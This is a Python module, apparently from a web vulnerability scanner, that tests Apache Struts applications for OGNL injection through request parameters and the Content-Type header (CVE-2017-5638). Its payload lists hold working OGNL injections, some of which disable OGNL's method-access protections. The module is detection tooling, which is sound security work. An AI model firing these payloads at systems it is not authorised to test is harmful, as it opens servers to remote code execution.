"""
OGNL Injection Scanner Module

Detects Object-Graph Navigation Language (OGNL) injection vulnerabilities
in Java applications, particularly Apache Struts framework.
OGNL injection can lead to Remote Code Execution.
"""

from typing import List, Dict, Any
from core.base_module import BaseModule
from core.logger import get_logger
import re
import random
import string

logger = get_logger(__name__)


class OGNLInjectionModule(BaseModule):
    """OGNL Injection Scanner Module"""

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize OGNL Injection module"""
        super().__init__(module_path, payload_limit=payload_limit)

        # Random markers for detection (prevents false positives)
        self.marker = ''.join(random.choices(string.ascii_lowercase, k=8))
        self.marker_num = random.randint(100000, 999999)
        self.expected_result = str(self.marker_num * 2)

        # OGNL Injection payloads
        self.ognl_payloads = [
            # Math expression detection (safe)
            {
                'payload': f'${{#a={self.marker_num}*2}}',
                'detect': self.expected_result,
                'description': 'OGNL expression evaluation via ${}',
                'severity': 'Critical'
            },
            {
                'payload': f'%{{#a={self.marker_num}*2}}',
                'detect': self.expected_result,
                'description': 'OGNL expression evaluation via %{}',
                'severity': 'Critical'
            },
            # System property access
            {
                'payload': '${@java.lang.System@getProperty("os.name")}',
                'detect': r'(Windows|Linux|Mac|Unix|Solaris)',
                'description': 'OGNL OS name disclosure via System.getProperty',
                'severity': 'High',
                'regex': True
            },
            {
                'payload': '%{@java.lang.System@getProperty("java.version")}',
                'detect': r'\d+\.\d+\.\d+',
                'description': 'OGNL Java version disclosure',
                'severity': 'High',
                'regex': True
            },
            # Context access - FIXED: Require OGNL-specific output patterns
            {
                'payload': '${#context}',
                'detect': r'(OgnlContext|ValueStack|ActionContext|xwork\.)',
                'description': 'OGNL context object access',
                'severity': 'High',
                'regex': True
            },
            # REMOVED: %{#session} with generic "session" detection - causes false positives
            # The word "session" appears in many contexts (SQL errors, normal page content)
            # Instead, use context access that returns OGNL-specific output
            {
                'payload': '%{#session.class.name}',
                'detect': r'(org\.apache\.|javax\.servlet|HttpSession)',
                'description': 'OGNL session class access',
                'severity': 'High',
                'regex': True
            },
            # Runtime access (critical - RCE possible)
            {
                'payload': f'${{#rt=@java.lang.Runtime@getRuntime(),#rt.availableProcessors()}}',
                'detect': r'^[1-9][0-9]*$',
                'description': 'OGNL Runtime access - processor count',
                'severity': 'Critical',
                'regex': True
            },
            # CVE-2017-5638 style (Struts2 Content-Type)
            {
                'payload': f'%{{("{self.marker}")}}',
                'detect': self.marker,
                'description': 'OGNL string evaluation (CVE-2017-5638 style)',
                'severity': 'Critical'
            },
            # Member access manipulation
            {
                'payload': '${#_memberAccess["allowStaticMethodAccess"]=true}',
                'detect': 'true',
                'description': 'OGNL memberAccess manipulation',
                'severity': 'Critical'
            },
        ]

        # Struts indicators for targeted scanning
        self.struts_indicators = ['.action', '.do', 'struts', 'xwork', 'ActionServlet']

        logger.info(f"OGNL Injection module loaded: {len(self.ognl_payloads)} payloads")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Scan for OGNL injection vulnerabilities

        Args:
            targets: List of URLs with parameters
            http_client: HTTP client

        Returns:
            List of vulnerability results
        """
        results = []

        logger.info(f"Starting OGNL Injection scan on {len(targets)} targets")

        for target in targets:
            url = target.get('url')
            params = target.get('params', {})
            method = target.get('method', 'GET').upper()

            if not params:
                continue

            # Check if target appears to be Struts
            is_struts = self._is_likely_struts(url, http_client)
            if is_struts:
                logger.info(f"Struts indicators found at {url}")

            # Get baseline response for false positive detection
            try:
                if method == 'POST':
                    baseline_response = http_client.post(url, data=params)
                else:
                    baseline_response = http_client.get(url, params=params)

                baseline_text = getattr(baseline_response, 'text', '') if baseline_response else ''
            except:
                baseline_text = ''

            # Test each parameter
            for param_name in params:
                if self.should_stop():
                    return results

                for payload_info in self.ognl_payloads:
                    payload = payload_info['payload']
                    detect_pattern = payload_info['detect']
                    description = payload_info['description']
                    severity = payload_info['severity']
                    is_regex = payload_info.get('regex', False)

                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        if method == 'POST':
                            response = http_client.post(url, data=test_params)
                        else:
                            response = http_client.get(url, params=test_params)

                        if not response:
                            continue

                        response_text = getattr(response, 'text', '')

                        # Check for detection pattern
                        if is_regex:
                            match = re.search(detect_pattern, response_text, re.IGNORECASE)
                            if not match:
                                continue
                            matched_value = match.group(0)

                            # FALSE POSITIVE CHECK: Pattern shouldn't exist in baseline
                            if re.search(detect_pattern, baseline_text, re.IGNORECASE):
                                continue
                        else:
                            if detect_pattern not in response_text:
                                continue
                            matched_value = detect_pattern

                            # FALSE POSITIVE CHECK: Pattern shouldn't exist in baseline
                            if detect_pattern in baseline_text:
                                continue

                        # CRITICAL FALSE POSITIVE CHECK: Payload reflection
                        # If the payload is reflected in an error message (SQL error, etc.),
                        # it's NOT real OGNL execution - the detection match is from the reflected payload text
                        if self._is_payload_reflected(payload, matched_value, response_text):
                            logger.debug(f"Skipping false positive: payload reflected in response")
                            continue

                        # CONFIRMED VULNERABILITY
                        evidence = self._build_evidence(
                            url, param_name, payload, description,
                            matched_value, response_text
                        )

                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=param_name,
                            payload=payload[:200],
                            evidence=evidence,
                            description=f"OGNL Injection: {description}. This vulnerability can lead to Remote Code Execution on the server.",
                            confidence=0.92,
                            severity=severity,
                            method=method,
                            response=response_text[:3000]
                        )

                        result['matched_value'] = matched_value
                        result['is_struts'] = is_struts
                        result['verified'] = True

                        results.append(result)
                        logger.warning(f"OGNL Injection found: {description} in {param_name}")

                        # Found vuln in this param, move to next
                        break

                    except Exception as e:
                        logger.debug(f"Error testing OGNL payload: {e}")
                        continue

            # Test Content-Type header for CVE-2017-5638
            if is_struts:
                header_results = self._test_header_injection(url, http_client)
                results.extend(header_results)

        logger.info(f"OGNL Injection scan complete: {len(results)} vulnerabilities found")
        return results

    def _is_likely_struts(self, url: str, http_client: Any) -> bool:
        """Check if URL appears to be a Struts application"""
        url_lower = url.lower()

        for indicator in self.struts_indicators:
            if indicator in url_lower:
                return True

        # Check response for Struts indicators
        try:
            response = http_client.get(url)
            if response:
                headers_str = str(response.headers).lower()
                body = (response.text or '').lower()[:5000]

                struts_hints = ['struts', 'xwork', '.action', 'ognl', 'valuestack']
                for hint in struts_hints:
                    if hint in headers_str or hint in body:
                        return True
        except:
            pass

        return False

    def _test_header_injection(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test HTTP headers for OGNL injection (CVE-2017-5638)"""
        results = []

        # Content-Type header payloads
        ct_payloads = [
            {
                'payload': f'%{{("{self.marker}")}}',
                'detect': self.marker,
                'description': 'CVE-2017-5638 OGNL via Content-Type'
            },
            {
                'payload': '%{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.System@getProperty("os.name")}',
                'detect': r'(Windows|Linux|Mac)',
                'description': 'CVE-2017-5638 OGNL RCE via Content-Type',
                'regex': True
            },
        ]

        for ct_info in ct_payloads:
            try:
                headers = {
                    'Content-Type': ct_info['payload'],
                    'User-Agent': 'Mozilla/5.0'
                }

                response = http_client.post(url, headers=headers, data='test=1')

                if response and response.text:
                    detect = ct_info['detect']
                    is_regex = ct_info.get('regex', False)

                    if is_regex:
                        match = re.search(detect, response.text, re.IGNORECASE)
                        if match:
                            evidence = self._build_evidence(
                                url, 'Content-Type header', ct_info['payload'],
                                ct_info['description'], match.group(0), response.text
                            )

                            result = self.create_result(
                                vulnerable=True,
                                url=url,
                                parameter='Content-Type header',
                                payload=ct_info['payload'][:200],
                                evidence=evidence,
                                description=f"OGNL Injection: {ct_info['description']}. Remote Code Execution is possible.",
                                confidence=0.95,
                                severity='Critical',
                                method='POST (Header)',
                                response=response.text[:3000]
                            )

                            result['cve'] = 'CVE-2017-5638'
                            result['verified'] = True
                            results.append(result)
                            logger.warning(f"CVE-2017-5638 OGNL found at {url}")
                            break
                    else:
                        if detect in response.text:
                            evidence = self._build_evidence(
                                url, 'Content-Type header', ct_info['payload'],
                                ct_info['description'], detect, response.text
                            )

                            result = self.create_result(
                                vulnerable=True,
                                url=url,
                                parameter='Content-Type header',
                                payload=ct_info['payload'][:200],
                                evidence=evidence,
                                description=f"OGNL Injection: {ct_info['description']}",
                                confidence=0.95,
                                severity='Critical',
                                method='POST (Header)',
                                response=response.text[:3000]
                            )

                            result['cve'] = 'CVE-2017-5638'
                            result['verified'] = True
                            results.append(result)
                            break

            except Exception as e:
                logger.debug(f"Error testing Content-Type injection: {e}")
                continue

        return results

    def _is_payload_reflected(self, payload: str, matched_value: str, response_text: str) -> bool:
        """
        Check if the detection match is from a reflected payload (false positive).

        Example false positive:
        - Payload: %{#session}
        - Response: "You have an error ... '%{#session}' at line 1"
        - The word "session" is found, but it's FROM the reflected payload, not OGNL execution

        Real OGNL execution would show: org.apache.struts2.dispatcher.SessionMap
        """
        # Check if payload appears in the response (reflection)
        if payload in response_text or payload[:30] in response_text:
            # Payload is reflected - now check if the matched value is NEAR the reflected payload
            # Find where the payload is reflected
            payload_short = payload[:30]
            payload_pos = response_text.find(payload_short)
            if payload_pos == -1:
                payload_pos = response_text.find(payload)

            if payload_pos >= 0:
                # Get context around the reflected payload
                context_start = max(0, payload_pos - 50)
                context_end = min(len(response_text), payload_pos + len(payload) + 50)
                reflection_context = response_text[context_start:context_end]

                # If the matched value is in the reflection context, it's a false positive
                if matched_value.lower() in reflection_context.lower():
                    # Additional check: look for OGNL execution evidence elsewhere
                    # Real OGNL would show class names, object dumps, etc.
                    ognl_execution_evidence = [
                        'org.apache.', 'javax.servlet.', 'java.lang.',
                        'OgnlContext', 'ValueStack', 'ActionContext',
                        '@java.lang.', 'getRuntime()', '.class.name'
                    ]

                    # If we find REAL execution evidence outside the reflection, it's valid
                    response_without_reflection = (
                        response_text[:context_start] + response_text[context_end:]
                    )
                    for evidence in ognl_execution_evidence:
                        if evidence in response_without_reflection:
                            return False  # Real OGNL execution found

                    # No real execution evidence - it's just reflection
                    return True

        # Check for common error message patterns that indicate reflection
        error_patterns = [
            r"error.*'[^']*" + re.escape(matched_value) + r"[^']*'",
            r"exception.*" + re.escape(matched_value),
            r"syntax.*" + re.escape(matched_value),
            r"invalid.*" + re.escape(matched_value),
            r"'" + re.escape(payload[:20]) + r".*'",
        ]

        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        return False

    def _build_evidence(self, url: str, param: str, payload: str, desc: str, match: str, response: str) -> str:
        """Build detailed evidence string"""
        context = self.extract_response_context(response, match, 150, 100)

        evidence = f"""OGNL Injection Confirmed

**Vulnerable URL:** {url}
**Vulnerable Parameter:** {param}
**Attack Type:** {desc}

**Injected Payload:**
{payload[:300]}

**Matched Value in Response:**
{match}

**Response Context:**
{context}

**Security Impact:**
- Remote Code Execution on the server
- Complete server compromise
- Data theft and manipulation
- Lateral movement within the network

**Related CVEs:**
- CVE-2017-5638 (Apache Struts)
- CVE-2018-11776 (Apache Struts)
- CVE-2020-17530 (Apache Struts)
"""
        return evidence


def get_module(module_path: str, payload_limit: int = None):
    """Create module instance"""
    return OGNLInjectionModule(module_path, payload_limit=payload_limit)
